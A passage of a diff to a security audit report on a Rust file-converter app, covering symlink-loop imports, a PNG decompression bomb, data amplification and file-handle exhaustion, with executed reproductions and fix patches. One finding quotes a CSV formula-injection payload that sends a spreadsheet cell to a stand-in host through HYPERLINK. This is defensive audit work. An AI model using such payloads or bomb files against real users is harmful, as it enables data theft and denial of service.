-Actual writes use `File::create(output)` (`:159`), `std::fs::write(output, out)` (`:216`), image path-saving APIs (`:163,184`), or unconditional FFmpeg `-y` (`:338`). `Options::overwrite` is not enforced by any backend write. All outputs are planned before the workers start (`src/main.rs:124-158`). `HashSet<PathBuf>` does not give filesystem object identity or Windows case-insensitive comparison.
-
-**Concrete scenarios and reproduction:**
-
-1. Plan `race.yaml` with `overwrite=false`; another process creates that file before the worker writes. The probe wrote `SENTINEL_CREATED_AFTER_PLANNING` in this interval. Calling the actual data backend replaced it with `new: true\n` and returned success.
-2. On a normal case-insensitive Windows filesystem, queue `A.json` and `a.yaml`, and select CSV for both. Before either output exists, the planner reserves both `A.csv` and `a.csv` as different paths with `overwrite=false`. The probe observed `origin\nA\n` after the first conversion and `origin\nB\n` when rereading the first output after the second. Workers may also write simultaneously, producing corruption rather than a clean last writer.
-3. A malicious writer in a shared output directory can replace a checked path or parent with a link between planning and opening. The eventual writer follows filesystem resolution, not the object checked earlier. Exact consequences depend on permissions/platform link behavior.
-
-**Impact:** silent loss/corruption despite the default non-overwrite setting. Atomic creation also matters for dangling links, for which `Path::exists()` can be false.
-
-**Fix sketch:** make output ownership/no-clobber a writer-level guarantee. Encode to a unique same-directory temporary file, flush it, then commit with an atomic no-replace operation when overwriting is disabled. On conflict, choose another name and retry the commit. Where directories themselves are hostile, anchor operations to trusted directory handles and enforce link/reparse-point policy.
-
-```diff
-- let output = converter::plan_output(...);
-+ let output = plan_output_transaction(..., opts.overwrite)?;
-  // Workers encode into output's owned temporary file/handle.
-- std::fs::write(output, out)?;
-+ output.write_all(out.as_bytes())?;
-+ output.flush()?;
-+ output.commit_no_clobber_or_replace()?;
-```
-
-Do not implement this as `exists()` followed by a normal rename. Merely changing FFmpeg to `-n` cannot repair the image/data paths or every filesystem race. Test case-insensitive aliases and symlinks in addition to exact strings.
-
-### CC-02 — Failure cleanup removes old outputs; early truncation loses them
-
-**Severity:** Medium. **Status:** Confirmed. **Trigger:** malformed/incompatible input with overwrite enabled, or a destination created after planning under CC-01.
-
-**Evidence — `src/converter.rs:351-355`:**
-
-```rust
-if !out.status.success() {
-    let _ = std::fs::remove_file(output);
-    let stderr = String::from_utf8_lossy(&out.stderr);
-    let msg = stderr.lines().rev().find(|l| !l.trim().is_empty()).unwrap_or("unknown error");
-    bail!("ffmpeg: {msg}");
-}
-```
-
-This deletion does not establish that FFmpeg created the path. FFmpeg can fail while opening the input, before touching the existing destination. JPEG creates/truncates the destination before encoding and validation (`src/converter.rs:159-161`). Other image/data writes are likewise not transactional.
-
-**Reproduction:** create `broken.mp4` containing `not a media file`; create the chosen output `existing.wav` containing a sentinel. Conversion to WAV returns an error and `existing.wav` is gone. Probe result: `error=true, existing-output-survives=false`. This is reachable in the UI when overwriting is selected; passing default options directly also demonstrates that the backend does not enforce them.
-
-A second probe used a valid **1,072-byte PNG of dimensions 65,536 by 1** and a pre-existing `.jpg`. JPEG's encoder rejected it with `Invalid image size (65536 x 1) to encode as JPEG`, but the destination had already been opened with `File::create`. The probe confirmed **`existing_output_bytes=0`** after the error, replacing the old sentinel with an empty file.
-
-**Impact:** an unsuccessful conversion destroys a previously good output, including when the conversion never produced replacement data. An attacker can supply the invalid media/image, but selecting overwrite or winning a destination race is an additional precondition.
-
-**Fix sketch:** only remove a uniquely owned temporary output. Replace the old destination after complete successful encoding and checked flushing.
-
-```diff
-- .arg(output)
-+ .arg(transaction.temporary_path_with_target_extension())
-  ...
-- let _ = std::fs::remove_file(output);
-+ transaction.discard_temporary()?;
-  ...
-+ transaction.commit_after_success()?;
-```
-
-For FFmpeg, retain a format-recognizable temporary suffix or pass an explicit output muxer. Keep the previous destination intact on decoder failure, encoder failure, disk-full, cancellation, and child failure. A regression test should assert sentinel bytes remain unchanged for each failure class.
-
-### CC-03 — Output reservations do not protect all source identities
-
-**Severity:** Medium. **Status:** Confirmed. **Trigger:** overwrite mode with related names or aliased source paths.
-
-**Evidence — `src/main.rs:121-140`:**
-
-```rust
-let mut reserved = HashSet::new();
-// For each file independently:
-let output = converter::plan_output(
-    &f.path, self.out_dir.as_deref(), f.target,
-    self.opts.overwrite, &mut reserved,
-);
-```
-
-The planner compares only `candidate == input` for the current job (`src/converter.rs:126`). It neither seeds reservations with other source paths nor compares actual file identities.
-
-**Concrete scenarios:**
-
-- Queue `batch.json` containing `{"origin":"A"}` and `batch.yaml` containing `origin: B`. With overwrite enabled, convert the JSON to YAML and the YAML to JSON. The actual planner chooses the other job's source for each output. The probe confirmed `a_out==b=true, b_out==a=true`; after the first conversion the second source contained `origin: A`, permanently losing B. Concurrent scheduling makes the resulting data nondeterministic.
-- On Windows, converting `upper.JSON` to JSON with overwrite enabled passes the lexical self-path check because the candidate is `upper.json`. The probe confirmed lexical inequality and that the original file was rewritten. Hard links and parent-directory aliases are additional identity cases, not covered by lexical equality.
-
-**Impact:** original batch inputs are modified unexpectedly; other workers can read overwritten or partially written data. For FFmpeg, input/output alias rejection can also interact with CC-02's unconditional cleanup. That particular combined deletion was not separately tested.
-
-**Fix sketch:** collect and protect all source identities before planning outputs, including completed rows whose originals should remain protected. Canonicalization alone does not identify hard links and is not race-proof. Use platform file IDs/open handles where required, and make overwrite semantics explicitly exclude protected inputs.
-
-```diff
-- let mut reserved = HashSet::new();
-+ let protected_inputs = collect_source_file_identities(&self.files)?;
-+ let mut planner = OutputPlanner::new(protected_inputs);
-  ...
-- let output = converter::plan_output(...);
-+ let output = planner.plan_non_source_output(...)?;
-```
-
-Test cross-format cycles, case-only aliases, hard links, symlinked parents, and multiple source directories feeding one output directory. Combine this with CC-01's transaction enforcement.
-
-### CC-04 — Recursive folder import follows links and blocks the UI
-
-**Severity:** Medium. **Status:** Confirmed structural issue; a stack-overflow crash was not triggered during this audit.
-
-**Evidence — `src/main.rs:96-108`:**
-
-```rust
-if path.is_dir() {
-    if let Ok(entries) = std::fs::read_dir(&path) {
-        let mut children: Vec<_> = entries.flatten().map(|e| e.path()).collect();
-        children.sort();
-        for child in children {
-            self.add_path(child);
+fn add_path(&mut self, path: PathBuf) {
+    if path.is_dir() {                                   // follows symlinks/junctions
+        if let Ok(entries) = std::fs::read_dir(&path) {
+            let mut children: Vec<_> = entries.flatten().map(|e| e.path()).collect();
+            children.sort();
+            for child in children {
+                self.add_path(child);                    // native recursion, no depth/visited/budget
+            }
         }
+        return;
     }
-    return;
-}
-if self.files.iter().any(|f| f.path == path) { return; }
+    if self.files.iter().any(|f| f.path == path) {       // lexical dedupe, O(n) per file
 ```
 
-`is_dir()` follows directory links; there is no visited-directory set. The only duplicate check is for already-added files, after directory recursion, and is lexical. The whole routine runs inside the UI update's handlers (`src/main.rs:198-205,393-398,415-426`). Every directory's children are collected/sorted, and each file scans the existing queue for duplicates.
+It is called synchronously from the egui `update` handlers: the dialogs at `main.rs:253-259, 343-345` and drag-and-drop at `main.rs:475`.
 
-**Concrete failure scenario:** an attacker supplies a folder with links/junctions to ancestors or repeated subtrees. Import follows them rather than recognizing an already-visited directory. OS link/path-length limits may eventually stop one chain; they do not prevent combinatorial repeated traversal. A large plain folder or slow network share also blocks the UI because enumeration is synchronous. A link can import files outside the folder the user thought they selected.
+**Trigger.** An attacker ships a folder (tarball, git repo, network share, or USB stick) containing directory links back to an ancestor: `a -> .`, `b -> .`. The user drags it into ConvertCraft.
 
-**Reproduction sketch (not executed against the GUI):** on Unix, create a temporary `root` containing a small supported file and two links `a -> .`, `b -> .`; invoke folder import in an externally timed subprocess. Assert import completes within a budget and visits the real file once. Use Windows directory junctions for equivalent platform coverage. Do not run an uncapped cyclic fixture in the test runner itself. A separate deep ordinary directory tree tests stack depth without links.
+**Reproduction (executed).** Fixture: `loop\one.json`, `loop\a` and `loop\b` both junctions to `loop` (`mklink /J`, no admin needed). The replica of the traversal above, capped at 5 s:
 
-**Impact:** UI hangs, excessive CPU/memory, duplicate jobs, and unexpected enumeration outside the selected tree. Stack exhaustion is plausible with sufficiently deep traversable paths, but was not demonstrated.
+```
+finished=false elapsed_ms=5000 dirs_visited=1853 queued_files=1789 longest_path_chars=260
+```
 
-**Fix sketch:** background, iterative traversal; default to not following directory links/reparse points; enforce depth/file/time budgets and cancellation; track directory and file identities when links are allowed.
+Every one of the 1,789 queue entries is the same `one.json` under a different `a\b\a\…` path. The path space grows like 2^depth up to the OS limit, which is about 63 reparse points per path on Windows and ~40 symlinks (ELOOP) on Linux. In practice it **never finishes**: the window stops repainting and the user must kill the process. The lexical `any()` dedupe also makes the traversal quadratic. Had it finished, the planner would then give each alias a separate output: `one (1).yaml`, `one (2).yaml`, and so on.
+
+**Impact.** A guaranteed UI hang with unbounded memory growth from one drag-and-drop, plus enumeration outside the folder the user picked (a link to `C:\Users\<user>` gets walked). It does not corrupt data. The behaviour is documented (`docs/user-guide.md:23`), but documentation is not a mitigation.
+
+**Fix sketch.**
 
 ```diff
-- self.add_path(child); // recursive, on UI thread
-+ importer.enqueue(child); // iterative background traversal
-  ...
-+ let metadata = std::fs::symlink_metadata(&path)?;
-+ if is_link_or_reparse_point(&metadata) { return Ok(()); }
-+ if !visited.insert(directory_identity(&path)?) { return Ok(()); }
-+ budget.check_next_entry()?;
+-fn add_path(&mut self, path: PathBuf) {
+-    if path.is_dir() {
+-        if let Ok(entries) = std::fs::read_dir(&path) { … self.add_path(child) … }
++// Run on a background thread; send discovered files back over a channel.
++fn scan(root: PathBuf, tx: Sender<ScanEvent>, cancel: &AtomicBool) {
++    let mut stack = vec![(root, 0usize)];
++    let mut seen_dirs = HashSet::new();             // same_file::Handle or (dev, ino)
++    let mut budget = Budget { files: 50_000, dirs: 10_000, depth: 64 };
++    while let Some((path, depth)) = stack.pop() {
++        if cancel.load(Relaxed) { break; }
++        let md = match fs::symlink_metadata(&path) { Ok(m) => m, Err(e) => { tx.send(ScanEvent::Error(path, e)); continue } };
++        if is_link(&md) { tx.send(ScanEvent::SkippedLink(path)); continue; }   // default: don't follow
++        if md.is_dir() {
++            if depth >= budget.depth || !seen_dirs.insert(Handle::from_path(&path)?) || !budget.take_dir() { continue; }
++            for entry in fs::read_dir(&path)? { stack.push((entry?.path(), depth + 1)); }
++        } else if md.is_file() && budget.take_file() {
++            tx.send(ScanEvent::File(path));
++        }
++    }
++}
 ```
 
-On Windows, explicitly account for junction/reparse-point behavior rather than assuming all relevant objects are reported identically to Unix symlinks. Surface enumeration failures (MIN-02).
+Also switch the queue dedupe to a `HashSet` keyed by file identity.
 
-### CC-05 — Unbounded structured-data expansion and conversion work
+**Regression test sketch.** Create `root/one.json` plus two directory links back to `root`. Assert `scan` completes within 1 s and yields `one.json` exactly once.
 
-**Severity:** Medium. **Status:** Confirmed allocation/complexity behavior; intentional full-process OOM was not attempted.
+---
 
-**Evidence — `src/converter.rs:192-215`:**
+### F-02 — Image decompression amplification bypasses `image`'s limits (Medium, Confirmed)
+
+**Evidence** (`src/converter.rs:138-142, 170, 180`):
 
 ```rust
-let text = std::fs::read_to_string(input).context("cannot read file")?;
-let value: Value = match normalize_ext(&extension(input)) {
-    "json" => serde_json::from_str(&text).context("invalid JSON")?,
-    "yaml" => serde_yaml::from_str(&text).context("invalid YAML")?,
-    // ...
-};
-// Complete output is also materialized as a String.
+let img = image::ImageReader::open(input)?.with_guessed_format()?.decode()?;   // default Limits
+…
+DynamicImage::ImageRgba8(img.to_rgba8()).write_to(&mut writer, format)?;       // :170
+…
+encoder.encode_image(&DynamicImage::ImageRgb8(image.to_rgb8()))?;              // :180 (JPEG)
 ```
 
-**Evidence — `src/converter.rs:265-286`:**
+`Limits::default()` is `max_alloc = 512 MiB` with **no width or height limit** (`image-0.25.10/src/io/limits.rs:49-55`). The limit governs only the decoder's own buffer. `to_rgba8()` on an 8-bit grayscale image allocates **4×** the decoded size and isn't covered. Up to 4 workers do this concurrently (`main.rs:182-184`).
+
+**Reproduction (executed, release build).** `bomb.png` is a 16384×16384 all-zero L8 PNG of **260,811 bytes**.
+
+| Target | Peak working set | Output | Time |
+|---|---|---|---|
+| bmp | **1,347,612,672 B** | **1,073,741,946 B** written | 3.75 s |
+| jpg | 1,079,500,800 B | 7,340,659 B | 3.60 s |
+| png (no RGBA conversion) | 276,713,472 B | 1,341,557 B | 0.12 s |
+
+A folder of four such files, or the same file four times thanks to F-01, needs about 5.4 GB of RAM and 4 GiB of disk at once. An L8 image right at the 512 MiB limit (~23170²) roughly doubles these figures. GIF output also runs NeuQuant quantisation over the full image (CPU-heavy). ICO runs a Lanczos resize from full resolution.
+
+**Impact.** Out-of-memory termination of the app or heavy system swapping, plus disk exhaustion in the output directory. It's triggered by an innocuous-looking, sub-megabyte image.
+
+**Fix sketch.**
+
+```diff
+-let img = image::ImageReader::open(input)?.with_guessed_format()?.decode()?;
++let mut reader = image::ImageReader::open(input)?.with_guessed_format()?;
++let mut limits = image::Limits::default();
++limits.max_image_width = Some(MAX_SIDE);          // e.g. 16_384
++limits.max_image_height = Some(MAX_SIDE);
++limits.max_alloc = Some(MAX_DECODE_BYTES);        // e.g. 256 MiB
++reader.limits(limits);
++let img = reader.decode()?;
++let rgba_bytes = u64::from(img.width()) * u64::from(img.height()) * 4;
++ensure!(rgba_bytes <= MAX_RGBA_BYTES, "image too large to convert ({}×{})", img.width(), img.height());
+```
+
+Also add a process-wide memory semaphore, so that four concurrent jobs share one budget instead of each getting its own.
+
+---
+
+### F-03 — Structured-data amplification (Medium, Confirmed)
+
+**Evidence.**
+- `src/converter.rs:189`: `std::fs::read_to_string(input)` with no size limit, which also blocks forever if the path became a FIFO (M-6).
+- `:192`: `serde_yaml::from_str` expands aliases into an owned `Value`.
+- `:266-273`: the CSV header union uses `Vec::contains`, which is O(N·K).
+- `:275-288`: every row emits a field for every header, so N rows with distinct keys give N² cells. The whole document goes into `Writer<Vec<u8>>`, then `String::from_utf8`, then the file.
 
 ```rust
 let mut headers: Vec<&str> = Vec::new();
-for row in &rows {
-    for key in row.keys() {
-        if !headers.contains(&key.as_str()) { headers.push(key); }
-    }
-}
-// Then every row materializes one field for every union header.
+for row in &rows { for key in row.keys() { if !headers.contains(&key.as_str()) { headers.push(key); } } }
+let mut writer = csv::Writer::from_writer(Vec::new());
 ```
 
-For N rows with one distinct key per row, input size is roughly O(N log N), header deduplication makes O(N²) string comparisons, and the CSV has N² cells. `Writer<Vec<u8>>` holds the whole output in memory. `read_csv` also holds every parsed row (`:223-233`). Four workers can independently perform such work (`src/main.rs:151-167`).
+**Reproduction (executed, release build).** Input of the form `[{"k0":0},{"k1":0},…]` converted to CSV:
 
-**Bounded observed reproductions:**
+| rows | input bytes | output bytes | time |
+|---|---|---|---|
+| 1,000 | 10,891 | 1,005,890 | 25 ms |
+| 2,000 | 22,891 | 4,012,890 | 78 ms |
+| 4,000 | 46,891 | 16,026,890 | 211 ms |
 
-| Fixture | Input bytes | Output bytes | Observed conversion time |
-| --- | --- | --- | --- |
-| 500 JSON objects, one distinct key each | 5,391 | 252,890 | 28 ms |
-| 1,000 JSON objects, one distinct key each | 10,891 | 1,005,890 | 102 ms |
-| 2,000 JSON objects, one distinct key each | 22,891 | 4,012,890 | 402 ms |
-| YAML: 4,096-byte anchored scalar plus 1,000 aliases | 7,116 | 4,108,131 | Not separately timed |
+Growth is quadratic. Extrapolating, 40,000 rows (~0.5 MB input) gives about 1.6 GB of output held in memory, roughly twice over during `into_inner` and `from_utf8` (not run). Separately, YAML `anchor: &s <4096×'x'>` with `refs: [*s × 1000]` turned **7,116 bytes into 4,108,131 bytes** of JSON. `serde_yaml` does cap recursion and alias depth, so this is shallow amplification, not an unbounded billion-laughs expansion.
 
-Times are single debug-build observations, not a rigorous benchmark. The growth in output bytes is deterministic. The sparse JSON can be generated with `[{"k0":0},{"k1":0},...]`. Its approximate N²-cell growth means 100,000 sparse rows would require on the order of 10 GB just for delimiters/cells; that size was **not run**.
-
-The YAML case uses `anchor: &s <4096 x characters>` and `refs: [*s,*s,...]`. The locked serde_yaml has recursion and alias-jump limits (`serde_yaml-0.9.34+deprecated/src/de.rs:474-480,632-644`), so it would be inaccurate to claim completely unrestricted nesting or an unchecked classic billion-laughs expansion. Nevertheless, the demonstrated shallow scalar-alias amplification is accepted and the application has no expanded-byte/node budget.
-
-**Related resource boundaries:**
-
-- Images do have dependency defaults: `image 0.25.10/src/io/limits.rs:49-55` supplies a 512 MiB best-effort allocation limit, but no width/height caps. Therefore image decoding is not described here as completely unlimited. Application-level aggregate budgeting is absent; `to_rgb8`/`to_rgba8` and encoding allocate beyond the lifetime of individual decoder checks (`src/converter.rs:161,184`). Four concurrent decodes/encodes can still be expensive.
-- FFmpeg is synchronously awaited with `.output()` and no timeout/cancellation (`src/converter.rs:336-342`). stdout/stderr are collected in memory. A slow/long media job can occupy a worker for an unbounded application-controlled duration; there is no cancel UI. No specific infinite-loop media sample was established.
-- The MPSC channel is unbounded (`src/main.rs:150`), but successful execution sends at most two messages per queued job. It is not an independent infinite producer; bounding the queue and import size is the meaningful mitigation.
-
-**Impact:** attacker-supplied small documents can consume disproportionate memory/CPU, stall workers, or terminate the desktop process when memory is exhausted. Huge files, special files, and very slow shares add input-reading risks because regular-file/size/time policy is absent.
-
-**Fix sketch:** enforce input, expanded-data, row, column, cell, output-byte, and aggregate worker budgets. Stream where possible. A file-metadata size check alone is insufficient for growing files and alias/output expansion. Faster header membership alone does not fix N×K output size.
+**Fix sketch.**
 
 ```diff
-- let text = std::fs::read_to_string(input)?;
-+ let text = read_utf8_limited(input, limits.input_bytes)?;
-- if !headers.contains(&key.as_str()) { headers.push(key); }
-+ if seen_headers.insert(key.as_str()) {
-+     ensure!(headers.len() < limits.columns, "too many CSV columns");
-+     headers.push(key);
-+ }
-+ let cells = rows.len().checked_mul(headers.len())
-+     .ok_or_else(|| anyhow!("CSV size overflow"))?;
-+ ensure!(cells <= limits.cells, "CSV expansion limit exceeded");
-- let mut writer = csv::Writer::from_writer(Vec::new());
-+ let mut writer = csv::Writer::from_writer(BoundedWriter::new(temp, limits.output_bytes));
+-let text = std::fs::read_to_string(input).context("cannot read file")?;
++let mut text = String::new();
++File::open(input)?.take(MAX_DATA_INPUT + 1).read_to_string(&mut text)?;
++ensure!(text.len() as u64 <= MAX_DATA_INPUT, "data file too large");
+ …
+-if !headers.contains(&key.as_str()) { headers.push(key); }
++if seen.insert(key.as_str()) { headers.push(key); }
++ensure!(headers.len() <= MAX_CSV_COLUMNS, "too many CSV columns");
++ensure!(rows.len().saturating_mul(headers.len()) <= MAX_CSV_CELLS, "CSV would be too large");
+-let mut writer = csv::Writer::from_writer(Vec::new());
++let mut writer = csv::Writer::from_writer(BufWriter::new(output));   // stream into the staged file
 ```
 
-Use a parser/visitor capable of enforcing budgets **during** YAML expansion, not only after `Value` has been built. Explicit image dimension/pixel limits, a total memory semaphore, bounded child stderr, deadlines, and cancellation complement these changes.
+---
 
-### CC-06 — JPEG final buffered-write errors are silently discarded
+### F-04 — Two OS handles per queued job, held for the whole batch (Low; mechanism Confirmed, Unix failure Plausible)
 
-**Severity:** Medium. **Status:** Confirmed buffering mechanism with a fault-injected writer. Real disk-full conditions were not induced.
+**Evidence.**
+- `ProtectedInputs.files: HashSet<Handle>` keeps one open handle per input, deliberately (`output.rs:19-20, 65-68`).
+- Every `OutputPlan` also keeps `directory_handle: Handle` (`:92-93, 138`) and possibly `existing: Option<Handle>` (`:113-118`).
+- `App::start` builds **all** plans before any worker starts (`main.rs:143-172`).
+- On Unix, `same_file::Handle` holds `file: Option<File>`, i.e. an open file descriptor (`same-file-1.0.6/src/unix.rs:9-15`). Std does not raise `RLIMIT_NOFILE`.
 
-**Evidence — `src/converter.rs:159-161`:**
+**Reproduction (executed on Windows; the handle count stands in for the fd count).** 2,000 inputs planned into one output directory:
 
-```rust
-let file = BufWriter::new(File::create(output)?);
-let mut enc = JpegEncoder::new_with_quality(file, opts.jpeg_quality);
-enc.encode_image(&DynamicImage::ImageRgb8(img.to_rgb8()))?;
+```
+handles_before=67  handles_after_planner_new=2067  handles_with_2000_plans=4067  handles_after_drop=67
 ```
 
-The encoder owns the `BufWriter`; no explicit checked flush occurs before `Ok(())` (`:187`). In the locked image encoder, `encode_image` writes its final marker and returns without flushing the underlying writer (`image-0.25.10/src/codecs/jpeg/encoder.rs:621-623`). `BufWriter`'s destructor attempts to flush but cannot return errors to this function.
+**Failure scenario (inferred, not run).** With a 256 soft limit (common macOS default) or 1024 (common Linux default), `OutputPlanner::new` or `plan` starts returning `EMFILE` ("Too many open files"). That happens at roughly 100–120 queued files on macOS and 450–500 on Linux, after subtracting the GUI's own descriptors. If `OutputPlanner::new` fails, every row is marked failed (F-06). If planning succeeds but leaves almost no free descriptors, workers then fail to open inputs and staging files. A batch converter failing on an ordinary 300-photo folder is a real functional defect. There's no data loss, and errors are surfaced.
 
-**Concrete failure scenario:** creation succeeds but storage rejects the buffered data later (full filesystem/quota, disconnected share, late I/O error). A small JPEG fits entirely inside the buffer; encoding appears successful before any underlying write. The application reports Done because the converter returned success (`src/main.rs:162-165,179-181`). The file may be empty or truncated, and a user may delete the original believing conversion succeeded.
-
-**Reproduction:** the external `flush_probe` wraps a writer whose `write()` always returns an I/O error in the same default `BufWriter`, then encodes a 1×1 image. Observed:
-
-```text
-encode success=true, underlying write attempts=0
-after encoder drop: underlying write attempts=1, error not returned
-```
-
-**Fix sketch:** keep ownership of the buffer outside the encoder and propagate flushing errors; combine with transactional outputs from CC-01/02.
+**Fix sketch.** Store identity *keys* instead of open handles. A recycled ID can only cause a false positive here, which is the safe direction: it skips a name.
 
 ```diff
-+ use std::io::Write;
-- let file = BufWriter::new(File::create(output)?);
-- let mut enc = JpegEncoder::new_with_quality(file, opts.jpeg_quality);
-- enc.encode_image(&DynamicImage::ImageRgb8(img.to_rgb8()))?;
-+ let mut file = BufWriter::new(File::create(output)?);
-+ {
-+     let mut enc = JpegEncoder::new_with_quality(&mut file, opts.jpeg_quality);
-+     enc.encode_image(&DynamicImage::ImageRgb8(img.to_rgb8()))?;
-+ }
-+ file.flush().context("cannot flush JPEG output")?;
+-    files: HashSet<Handle>,
++    files: HashSet<FileKey>,          // unix: (st_dev, st_ino) via MetadataExt; windows: Handle (cheap) or file ID
+ …
+-    directory_handle: Handle,
++    directory_key: FileKey,           // compare by key at begin()/commit()
 ```
 
-If durable-on-disk completion is promised, separately consider `sync_all` before committing; checked flushing and crash durability are distinct guarantees.
+Alternatively, or as well, raise the soft `RLIMIT_NOFILE` to the hard limit at startup on Unix, and plan lazily per worker rather than all up front.
 
-### CC-07 — CSV output carries attacker-controlled spreadsheet formulas
+---
 
-**Severity:** Medium. **Status:** Confirmed raw formula emission; spreadsheet evaluation/network effects are conditional and were not executed.
+### F-05 — CSV export writes spreadsheet formulas verbatim (Low, Confirmed)
 
-**Evidence — `src/converter.rs:275-286`:**
+**Evidence** (`src/converter.rs:276, 282`): `writer.write_record(&headers)?;` and `Some(Value::String(s)) => s.clone()`. Neither keys nor values are neutralised.
 
-```rust
-writer.write_record(&headers)?;
-// ...
-Some(Value::String(s)) => s.clone(),
-// ...
-writer.write_record(&record)?;
-```
-
-Neither object keys written as headers nor string values are checked for spreadsheet formula prefixes. CSV quoting escapes delimiters/quotes; it does not force a formula-looking cell to be interpreted as text.
-
-**Reproduction:** convert this JSON to CSV:
-
-```json
-[{"cell":"=1+1","=2+2":"literal"}]
-```
-
-Observed output:
+**Reproduction (executed).** Input `[{"cell":"=HYPERLINK(\"http://example.invalid/?x=\"&A1,\"click\")","=1+1":"literal","n":"@SUM(1,2)"}]` produces:
 
 ```csv
-=2+2,cell
-literal,=1+1
+=1+1,cell,n
+literal,"=HYPERLINK(""http://example.invalid/?x=""&A1,""click"")","@SUM(1,2)"
 ```
 
-**Attacker/impact:** a file supplier can place formulas in apparently ordinary data. If the converted CSV is opened with formula interpretation enabled, it can evaluate formulas, display misleading values, and potentially access external resources depending on spreadsheet capabilities and security settings. No claim of universal code execution is made. `docs/formats.md:73` warns about this behavior, which mitigates surprise but does not prevent it.
+**Impact.** When the user opens the converted CSV in Excel, LibreOffice, or Sheets, attacker formulas run in the user's spreadsheet context. They can show misleading values or exfiltrate neighbouring cells through `HYPERLINK`/`WEBSERVICE`, depending on application settings. **Rated Low (the previous audit said Medium)** because it is documented (`docs/formats.md:73`), needs a second application and user interaction, and current spreadsheet apps gate external content behind prompts.
 
-**Fix sketch:** expose an explicit spreadsheet-safe export mode, covering headers as well as fields, with tested handling of `=`, `+`, `-`, `@` and relevant leading whitespace/control characters for supported spreadsheet applications. Preserve a separately identified raw-data mode to avoid silently changing legitimate numeric/string data.
+**Fix sketch.** Add an opt-in (or default-on) "spreadsheet-safe CSV" mode, keeping raw output available:
 
 ```diff
-- writer.write_record(&headers)?;
-+ writer.write_record(headers.iter().map(|s| spreadsheet_text(s, policy)))?;
-- Some(Value::String(s)) => s.clone(),
-+ Some(Value::String(s)) => spreadsheet_text(s, policy),
++fn spreadsheet_safe(s: &str) -> Cow<'_, str> {
++    match s.chars().next() {
++        Some('=' | '+' | '-' | '@' | '\t' | '\r') => Cow::Owned(format!("'{s}")),
++        _ => Cow::Borrowed(s),
++    }
++}
+-writer.write_record(&headers)?;
++writer.write_record(headers.iter().map(|h| spreadsheet_safe(h)))?;
 ```
 
-For strong typed-cell guarantees, a typed spreadsheet format may be more appropriate than trying to make CSV behave identically across all spreadsheet importers. Test the actual applications being supported.
+---
 
-### CC-08 — Vulnerable locked XML version and unmaintained parser dependencies
+### F-06 — One unresolvable row fails the whole batch (Low, Confirmed)
 
-**Severity:** Low in the established application threat model. **Status:** Confirmed dependency versions/advisories; conversion-time exploitation of the XML advisories **Needs verification** and was not established. Unmaintained does not itself mean memory-unsafe or malicious.
+**Evidence** (`src/output.rs:49-68`): every input must canonicalize, be a regular file, and open as a `Handle`, otherwise `OutputPlanner::new` returns `Err`. `App::start` then marks **every** non-done row failed and schedules nothing (`main.rs:130-142`). The planner covers *all* rows, including completed ones (`main.rs:131`).
 
-**Evidence — `Cargo.lock:2878-2885`:**
+**Reproduction (executed).** Queue `a.json` and `b.json`, delete `b.json`, then call `OutputPlanner::new([a, b])`:
 
-```toml
-name = "quick-xml"
-version = "0.30.0"
-source = "registry+https://github.com/rust-lang/crates.io-index"
+```
+planner error: cannot resolve source: …\b.json: Das System kann die angegebene Datei nicht finden. (os error 2)
 ```
 
-Both RUSTSEC-2026-0194 and RUSTSEC-2026-0195 affect this version and recommend `>=0.41.0`. A second, fixed `quick-xml 0.41.0` entry at `Cargo.lock:2888-2894` does not replace or cure the old version.
+**Triggers.**
+- An attacker folder containing a dangling symlink named `x.json`, or a symlink to a device, FIFO, or directory (`is_file()` is false).
+- A user who deletes originals after a successful run and then queues more files without first pressing "Clear finished" (a common workflow).
+- A file that is locked or unreadable (a permission error on canonicalize or open).
 
-**Reachability:** the Windows dependency tree has no `quick-xml 0.30.0`. In the all-target tree it enters through the Linux accessibility stack's zbus-lockstep tooling. Inspection of `atspi-common-0.6.0/src/cache.rs:13` shows `#[validate(...)]`; `zbus-lockstep-macros-0.4.4/src/lib.rs:107-158` resolves XML paths, reads files, and calls `zbus_xml::Node::try_from` at macro expansion. The macro documents an overriding `LOCKSTEP_XML_PATH` environment variable (`:19-20,51-52`). This establishes a build-time XML path, not a first-party document conversion or unauthenticated network path. Supplying malicious XML through build inputs/environment could expose build-time resource exhaustion if affected parser operations are reached; the exact advisory-specific operations were not proven here.
+**Impact.** No conversion happens at all, and every row shows the same error. That's an availability nuisance, and documented (`docs/development.md:51`).
 
-**Evidence — directly reachable unmaintained YAML backend:**
+**Fix sketch.**
+
+```diff
+-pub fn new<'a>(inputs: impl IntoIterator<Item = &'a Path>) -> Result<Self> {
++/// Returns the planner plus per-input errors; inputs that don't exist need no protection,
++/// inaccessible ones are protected by lexical key only and their rows are failed individually.
++pub fn new<'a>(inputs: impl IntoIterator<Item = &'a Path>) -> (Self, Vec<(usize, anyhow::Error)>) {
+```
+
+---
+
+### F-07 — Worker panics and app shutdown are unmanaged (Low, Confirmed by code)
+
+**Evidence.**
+- Workers are detached `thread::spawn` loops with no `catch_unwind` (`main.rs:191-204`).
+- A panic anywhere in a decoder, encoder, or parser ends that worker after `Msg::Started` was sent, so the row stays **Running** forever. When all senders drop, `poll` only sets `rx = None` (`main.rs:222-224`).
+- If all 4 workers panic, the jobs still queued never run, and the progress bar never reaches `total`.
+- Release builds use `windows_subsystem = "windows"`, so the panic message goes nowhere.
+- When the window closes, `main` returns and the process exits without joining workers. Destructors in those threads don't run, leaving `.convertcraft-XXXX` staging directories (with partial data) in the user's folders.
+- `ffmpeg` children (`converter.rs:371-376`) are not in a job object or process group, so on Windows they keep running to completion after the GUI exits.
+
+No concrete panicking input was found in the locked decoders during this review. The panic trigger is **Plausible**; the missing handling is **Confirmed**. The project documents this (`docs/development.md:61, 75`).
+
+**Fix sketch.**
+
+```diff
+-let result = converter::convert(&job.input, job.output, job.category, job.target, &opts)
+-    .map_err(|e| format!("{e:#}"));
++let result = std::panic::catch_unwind(AssertUnwindSafe(|| {
++    converter::convert(&job.input, job.output, job.category, job.target, &opts)
++}))
++.unwrap_or_else(|_| Err(anyhow!("internal error while converting (panic)")))
++.map_err(|e| format!("{e:#}"));
+```
+
+In `poll`'s `Disconnected` arm, mark leftover Running and Pending rows failed. Keep `JoinHandle`s and `Child`s; on exit (`eframe::App::on_exit`), set a cancel flag, kill the children (or put them in a Windows job object with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`), and join.
+
+---
+
+### F-08 — FFmpeg boundary: no deadline, unbounded stderr, unrestricted demuxers (Low; Needs verification across FFmpeg builds)
+
+**Evidence** (`src/converter.rs:371-376`):
 
 ```rust
-// src/converter.rs:196
